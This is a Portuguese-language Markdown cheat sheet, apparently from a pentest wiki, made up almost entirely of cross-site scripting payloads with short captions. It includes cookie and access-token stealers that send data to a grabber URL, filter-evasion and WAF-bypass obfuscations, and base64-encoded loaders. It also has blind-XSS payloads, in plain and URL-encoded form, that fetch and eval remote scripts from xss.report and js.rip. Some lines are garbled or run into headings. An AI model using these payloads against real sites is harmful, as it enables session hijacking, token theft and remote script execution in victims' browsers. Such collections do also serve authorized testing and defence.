---
description: Exemplos
---

# XSS Payloads

### One For All (Polyglot)

Payload versatil para testar multiplos contextos (HTML, JS, SSTI, CSTI).

```angular-html
<img src=x>'"${{7*7}}
```

### Data Grabber (Cookie Stealing)

Payloads focados em exfiltração de cookies e tokens de armazenamento local.

```javascript
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>HTML & Applications (Basic Alerts)
```

Payloads clássicos para prova de conceito (PoC).

```javascript
<script>al\u0065rt(1337)</script>
);alert('XSS
#1' onerror="alert('XSS')"
"><script>confirm(1)</script>
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
"><script>alert("XSS")</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert("XSS");>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
javascript:alert("XSS")
#hTTP://[pastebin.com/raw/ycjGCXDY](https://pastebin.com/raw/ycjGCXDY)	alert("XSS");
"/>%20<p+oncontentvisibilityautostatechange="alert(/CVE-Hunters/)"%20style="content-visibility:auto
```

### Doom (WASM Injection)

Executa o jogo Doom dentro de um iframe via XSS.

```javascript
<%2Fscript><iframe%20src%3D"https%3A%2F%2Fjs-dos.com%2Fgames%2Fdoom.exe.html"%20style%3D"position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20bottom%3A0%3B%20right%3A0%3B%20width%3A100%25%3B%20height%3A100%25%3B%20border%3Anone%3B%20margin%3A0%3B%20padding%3A0%3B%20overflow%3Ahidden%3B%20z-index%3A999999%3B"><%2Fiframe>
"><script>eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxpZnJhbWUgc3JjPSJodHRwczovL2pzLWRvcy5jb20vZ2FtZXMvZG9vbS5leGUuaHRtbCIgc3R5bGU9InBvc2l0aW9uOmZpeGVkO3RvcAw7bGVmdAw7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtib3JkZXI6bm9uZTt6LWluZGV4Ojk5OTk5Ij48L2lmcmFtZT4nIA'))</script>
```

### Markdown XSS

Vetores específicos para renderizadores de Markdown vulneráveis.

```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)SVG Payloads
```

Vetores utilizando Scalable Vector Graphics.

```javascript
"><svG onLoad=prompt(String. fromCharCode (77,114,82,97,105,110,95,49,57,57,54))>
<svg xmlns='[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)' onload='alert(document.domain)'/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### WAF Bypass & Obfuscation

Técnicas para evadir filtros e listas negras.

````javascript
eval('ale'+'rt(0)');
Function('ale'+'rt(1)')();
new Function`alert`6``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`alert(14)```;
````

### Generic & Polyglots

Mistura de contextos para quebra de parsers.

```javascript
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
<script src="data:,alert(1)%250A-->
<script>alert(1)%0d%0a-->%09</script
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
<script>location.href;'javascript:alert%281%29'</script>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
\');confirm(1);//
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
<meter onmouseover="alert(1)"
">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
$.get('http://sakurity.com/jqueryxss')
javas&#x09;cript://www.google.com/%0Aalert(1)
><svg/onload=alert(1)>
><svg onload=alert(12)>
<div onmouseover="alert('XSS1')">Passe o mouse</div>
><iNput///type=password"////id="CF-bypaSS"%20name="query"////value=""///oNfocUs="alert(%27chux%27)"%20AutOfoCus=""%20/>
;alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,No known CVE></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('PoC') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('PoC')//>\x3e
><a href="#" onclick="alert('XSS')">Click me</a>
```

### Blind XSS (XSS.Report)

Payloads configurados para callback no serviço xss.report.

```javascript
"><script src=https://xss.report/c/tr0p></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/tr0p\';document.body.appendChild(a)')
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/tr0p");a.send();</script>
var a=document.createElement("script");a.src="https://xss.report/c/tr0p";document.body.appendChild(a);
<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/tr0p\';document.body.appendChild(a)')" />
<div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)">Hover me</div>
<body onload="var a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)">
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/tr0p&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<script>$.getScript("//xss.report/c/tr0p")</script>
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\tr0p/.source))//>
<iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)"></iframe>
<audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)">
<script>fetch("//xss.report/c/tr0p").then(r=>r.text()).then(t=>eval(t))</script>
```

#### Encoded (XSS.Report)

```javascript
%22%3E%3Cscript%20src=https://xss.report/c/tr0p%3E%3C/script%3E
javascript:eval('var%20a=document.createElement(%5C'script%5C');a.src=%5C'https://xss.report/c/tr0p%5C';document.body.appendChild(a)')
%22%3E%3Cvideo%3E%3Csource%20onerror=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%3E
%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//xss.report/c/tr0p%22);a.send();%3C/script%3E
var%20a=document.createElement(%22script%22);a.src=%22https://xss.report/c/tr0p%22;document.body.appendChild(a);
%3Csvg%20onload=%22javascript:eval('var%20a=document.createElement(%5C'script%5C');a.src=%5C'https://xss.report/c/tr0p%5C';document.body.appendChild(a)')%22%20/%3E
%3Cdiv%20onmouseover=%22var%20a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)%22%3EHover%20me%3C/div%3E
%3Cbody%20onload=%22var%20a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)%22%3E
%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror=eval(atob(this.id))%3E
%22%3E%3Cinput%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3RyMHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20autofocus%3E
%22%3E%3Ciframe%20srcdoc=%22&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/tr0p&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;%22%3E
%3Cscript%3E$.getScript(%22//xss.report/c/tr0p%22)%3C/script%3E
javascript:%22/*'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report%5Cc%5Ctr0p/.source))//%3E
%3Ciframe%20src=%22javascript:var%20a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)%22%3E%3C/iframe%3E
%3Caudio%20src=%22x%22%20onerror=%22var%20a=document.createElement('script');a.src='https://xss.report/c/tr0p';document.body.appendChild(a)%22%3E
%3Cscript%3Efetch(%22//xss.report/c/tr0p%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E
```

### XSS Hunter (Truffle Security)

Payloads para a plataforma XSS Hunter.

```javascript
"><script src="https://js.rip/CVE-Hunters"></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/CVE-Hunters\';document.body.appendChild(a)')
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL0NWRS1IdW50ZXJzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL0NWRS1IdW50ZXJzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL0NWRS1IdW50ZXJzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw>
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/CVE-Hunters&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/CVE-Hunters");a.send();</script>
<script>$.getScript("https://js.rip/CVE-Hunters")</script>
```
